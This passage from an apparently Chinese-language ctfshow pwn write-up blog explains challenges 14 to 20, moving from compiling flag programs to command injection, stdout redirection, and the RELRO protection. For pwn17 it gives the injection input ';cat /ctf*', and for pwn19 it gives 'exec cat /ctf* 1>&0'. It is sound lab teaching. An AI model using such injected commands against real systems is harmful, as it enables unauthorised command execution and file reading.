    fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"pwn14_key"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"Nothing here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">char</span> output<span class="token punctuation">[</span>BUFFER_SIZE <span class="token operator">*</span> <span class="token number">9</span> <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
    <span class="token keyword">int</span> offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    offset <span class="token operator">+=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span>output <span class="token operator">+</span> offset<span class="token punctuation">,</span> <span class="token string">"ctfshow&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> BUFFER_SIZE<span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                offset <span class="token operator">+=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span>output <span class="token operator">+</span> offset<span class="token punctuation">,</span> <span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> j<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">!=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                offset <span class="token operator">+=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span>output <span class="token operator">+</span> offset<span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            offset <span class="token operator">+=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span>output <span class="token operator">+</span> offset<span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    offset <span class="token operator">+=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span>output <span class="token operator">+</span> offset<span class="token punctuation">,</span> <span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
</code></pre>

<p>程序打开名为 “pwn14_key” 的文件，以二进制（”rb”）模式进行读取。如果文件打开失败，将输出错误消息 “Nothing here!” 并返回 -1。  </p>
<p>接下去就是通过循环将fp的值（也就是key的内容）逐个转为8位二进制数，通过”_”连接，用ctfshow{}包裹后存入output中</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"CTFshow"</span> <span class="token operator">></span> pwn14_key
gcc pwn14_flag.c <span class="token parameter variable">-o</span> pwn14
./pwn14
ctfshow<span class="token punctuation">&#123;</span>01000011_01010100_01000110_01110011_01101000_01101111_01110111_00001010<span class="token punctuation">&#125;</span></code></pre>

<h4 id="pwn15-nasm"><a href="#pwn15-nasm" class="headerlink" title="pwn15(nasm)"></a>pwn15(nasm)</h4><p>编译汇编代码到可执行文件，即可拿到flag</p>
<p>这段代码是一个使用 x86 汇编语言编写的程序，用于在标准输出上打印一串特定格式的字符串。要将这段代码编译为可执行文件，使用汇编器和链接器进行以下步骤：  </p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly">section .data
    str1 db &quot;CTFshow&quot;,0
    str2 db &quot;_3@sy&quot;,0
    str3 db &quot;@ss3mb1y&quot;,0
    str4 db &quot;_1s&quot;,0
    str5 db &quot;ctfshow&#123;&quot;
    str6 db &quot;&#125;&quot;

section .text
    global _start

_start:
    mov eax, 4 
    mov ebx, 1 
    mov ecx, str5 
    mov edx, 8
    int 0x80 

    mov eax, 4
    mov ebx, 1
    mov ecx, str3
    mov edx, 8
    int 0x80

    mov eax, 4
    mov ebx, 1
    mov ecx, str4
    mov edx, 3
    int 0x80

    mov eax, 4
    mov ebx, 1
    mov ecx, str2
    mov edx, 5
    int 0x80

    mov eax, 4
    mov ebx, 1
    mov ecx, str6
    mov edx, 1
    int 0x80

    mov eax, 1 
    xor ebx, ebx 
    int 0x80 </code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash">nasm <span class="token parameter variable">-f</span> elf pwn15_flag.asm <span class="token parameter variable">-o</span> pwn15.o
ld <span class="token parameter variable">-m</span> elf_i386 <span class="token parameter variable">-o</span> pwn15 pwn15.o
./pwn15
ctfshow<span class="token punctuation">&#123;</span>@ss3mb1y_1s_3@sy<span class="token punctuation">&#125;</span></code></pre>

<h4 id="pwn16-gcc-s"><a href="#pwn16-gcc-s" class="headerlink" title="pwn16(gcc .s)"></a>pwn16(gcc .s)</h4><p>使用gcc将其编译为可执行文件</p>
<p><code>.s</code> 文件是汇编语言源文件的一种常见扩展名。它包含了使用汇编语言编写的程序代码。汇编语言是一种低级编程语言，用于直接操作计算机的指令集架构。 <code>.s</code> 文件通常由汇编器（<code>Assembler</code>）处理，将其转换为可执行文件或目标文件。可以使用 <code>gcc</code> 命令直接编译汇编语言源文件（ <code>.s</code> 文件）并将其链接为可执行文件。 <code>gcc</code> 命令具有适用于多种语言的编译器驱动程序功能，它可以根据输入文件的扩展名自动选择适当的编译器和链接器</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">gcc pwn16_flag.s <span class="token parameter variable">-o</span> pwn16
./pwn16
ctfshow<span class="token punctuation">&#123;</span>daniuniuda<span class="token punctuation">&#125;</span></code></pre>

<h4 id="pwn17"><a href="#pwn17" class="headerlink" title="pwn17"></a>pwn17</h4><p>IDA 关键源码</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">menu</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nEnter the command you want choose:(1.2.3.4 or 5)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">;</span>
    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>off_140C <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">case</span> <span class="token number">1u</span><span class="token operator">:</span>
        v4 <span class="token operator">=</span> <span class="token string">"id"</span><span class="token punctuation">;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">2u</span><span class="token operator">:</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Which directory?('/','./' or the directiry you want?)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0xAuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        v3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">;</span>
        <span class="token function">strcat</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">system</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v4 <span class="token operator">=</span> <span class="token string">"Execution succeeded!"</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Execution succeeded!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">3u</span><span class="token operator">:</span>
        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"$cat /ctfshow_flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ctfshow&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"... ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your flag is ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ctfshow&#123;flag is not here!&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"wtf?You haven't left yet?\nOk~ give you flag:\nflag is loading......"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0x1BF52u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        v4 <span class="token operator">=</span> <span class="token string">"cat /ctfshow_flag"</span><span class="token punctuation">;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /ctfshow_flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">4u</span><span class="token operator">:</span>
        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        v4 <span class="token operator">=</span> <span class="token string">"su: Authentication failure"</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"su: Authentication failure"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">5u</span><span class="token operator">:</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"See you!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
      <span class="token keyword">default</span><span class="token operator">:</span>
        v4 <span class="token operator">=</span> <span class="token string">"command not found!"</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"command not found!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span></code></pre>

<p>选项2 命令拼接 <code>;cat /ctf*</code></p>
<h4 id="pwn18-追加"><a href="#pwn18-追加" class="headerlink" title="pwn18(&gt;&gt;追加)"></a>pwn18(&gt;&gt;追加)</h4><p>IDA反编译</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch]</span>
  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>

  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_B10<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_B90<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_C20<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_CB0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_D38<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_DD0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>aClassifyCtfsho<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Type  : Linux_Security_Mechanisms                               "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Site  : https://ctf.show/                                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Hint  : Do you know redirect output ?                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Which is the real flag?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token number">9</span> <span class="token punctuation">)</span>
    <span class="token function">fake</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    <span class="token function">real</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /ctfshow_flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>分别跟进<code>fake()</code>和<code>real()</code></p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">fake</span><span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span>
<span class="token keyword">int</span> <span class="token function">fake</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo 'flag is here'>>/ctfshow_flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">real</span><span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span>
<span class="token keyword">int</span> <span class="token function">real</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo 'flag is here'>/ctfshow_flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>可以看到fake是&gt;&gt;追加  real是&gt;覆盖写入</p>
<p>于是填9进入fake即可</p>
<h4 id="pwn19-1-0"><a href="#pwn19-1-0" class="headerlink" title="pwn19(1&gt;&amp;0)"></a>pwn19(1&gt;&amp;0)</h4><p>Hint: 关闭了输出流，一定是最安全的吗？</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-30h]</span>
  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-8h]</span>

  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_BF0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_C70<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_D00<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_D90<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_E18<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_EB0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>aClassifyCtfsho<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Type  : Linux_Security_Mechanisms                               "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Site  : https://ctf.show/                                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Hint  : Turn off output, how to get flag? "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">wait</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"flag is not here!"</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"give you a shell! now you need to get flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x20uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>if (fork()) : 这里使用 fork() 函数创建一个子进程。父进程中， fork() 返回子进程的进程ID，所以进入if 语句块；子进程中， fork() 返回0，所以进入 else 语句块。</p>
<p>在父进程中：</p>
<ul>
<li><p>wait(0LL) : 父进程通过 wait() 函数等待子进程的结束，以确保子进程执行完毕。</p>
</li>
<li><p>sleep(3u) : 父进程睡眠3秒钟。</p>
</li>
<li><p>printf(“flag is not here!”) : 输出提示信息，表明flag不在此处。</p>
</li>
</ul>
<p>在子进程中： </p>
<ul>
<li><p>puts(“give you a shell! now you need to get flag!”) : 输出提示信息，表示给予用户一个shell，让其获取flag。</p>
</li>
<li><p>fclose() : 关闭文件输出流。</p>
</li>
<li><p>read(0, &amp;buf, 0x20uLL) : 从标准输入中读取用户输入的命令，并存储在 buf 中。</p>
</li>
<li><p>system(&amp;buf) : 执行用户输入的命令。</p>
</li>
</ul>
<p>我们可以使用了 exec 函数来执行 sh 命令，并使用 1&gt;&amp;0 来进行输出重定向。这个命令将标准输出重定向到标准输入，实际上就是将命令的输出发送到后续命令的输入。</p>
<p>具体来说， 1&gt;&amp;0 中的 1 表示标准输出， 0 表示标准输入。通过将标准输出重定向到标准输入，可以实现将命令的输出作为后续命令的输入。这样可以在执行 sh 命令后，进入一个交互式的Shell环境，可以在该环境中执行命令并与用户进行交互。</p>
<p>也可以直接<code>exec cat /ctf* 1&gt;&amp;0</code> 将 <code>cat /ctf*</code> 命令的输出发送到标准输入，实际上就是将命令的输出再次输出到屏幕上</p>
<h4 id="pwn20-RELRO"><a href="#pwn20-RELRO" class="headerlink" title="pwn20(RELRO)"></a>pwn20(RELRO)</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/linyt/article/details/51635768">聊聊Linux动态链接中的PLT和GOT（１）——何谓PLT与GOT</a><br><a target="_blank" rel="noopener" href="https://linyt.blog.csdn.net/article/details/51636753">聊聊Linux动态链接中的PLT和GOT（２）——延迟重定位</a><br><a target="_blank" rel="noopener" href="https://linyt.blog.csdn.net/article/details/51637832">聊聊Linux动态链接中的PLT和GOT（３）——公共GOT表项</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52635170/article/details/131295234">PWN20-22</a></p>
<p><img src="pwn20_checksec.png" loading="lazy"></p>
<p>可以看到仅开启了NX保护，RELRO保护是完全关闭状态</p>
<p>这里先将一下RELRO保护：RELRO（RELocation Read-Only）是一种可选的二进制保护机制，用于增加程序的安全性。它主要通过限制和保护全局偏移表（Global Offset Table，简称 GOT）和过程链接表（Procedure Linkage Table，简称 PLT）的可写性来防止针对这些结构的攻击。</p>
<p>RELRO保护有三种状态：</p>
<ol>
<li>No RELRO：在这种状态下，GOT和PLT都是可写的，意味着攻击者可以修改这些表中的指<br>针，从而进行攻击。这是最弱的保护状态。</li>
<li>Partial RELRO：在这种状态下，GOT的开头部分被设置为只读（RO），而剩余部分仍然可<br>写。这样可以防止一些简单的攻击，但仍存在一些漏洞。</li>
<li>Full RELRO：在这种状态下，GOT和PLT都被设置为只读（RO）。这样做可以防止对这些结构<br>的修改，提供更强的保护。任何对这些表的修改都会导致程序异常终止。</li>
</ol>
<p><img src="pwn20_objdump.png" loading="lazy"></p>
<p><strong>objdump</strong>命令是Linux下的反汇编目标文件或者可执行文件的命令，它以一种可阅读的格式让你更多地了解二进制文件可能带有的附加信息。</p>
<ul>
<li>Linux下反汇编目标文件或者可执行文件。</li>
<li>查看静态库和动态库有哪些函数</li>
</ul>
<p>查看一下表项地址</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">❯ readelf <span class="token parameter variable">-S</span> pwn20
There are <span class="token number">29</span> section headers, starting at offset 0x1878:

Section Headers:
  <span class="token punctuation">[</span>Nr<span class="token punctuation">]</span> Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  <span class="token punctuation">[</span> <span class="token number">0</span><span class="token punctuation">]</span>                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">0</span>
  <span class="token punctuation">[</span> <span class="token number">1</span><span class="token punctuation">]</span> .interp           PROGBITS         0000000000400200  00000200
       000000000000001c  0000000000000000   A       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">1</span>
  <span class="token punctuation">[</span> <span class="token number">2</span><span class="token punctuation">]</span> .note.ABI-tag     NOTE             000000000040021c  0000021c
       0000000000000020  0000000000000000   A       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">4</span>
  <span class="token punctuation">[</span> <span class="token number">3</span><span class="token punctuation">]</span> .note.gnu.bu<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span> NOTE             000000000040023c  0000023c
       0000000000000024  0000000000000000   A       <span class="token number">0</span>     <span class="token number">0</span>     <span class="token number">4</span>
  <span class="token punctuation">[</span> <span class="token number">4</span><span class="token punctuation">]</span> .gnu.hash         GNU_HASH         0000000000400260  00000260
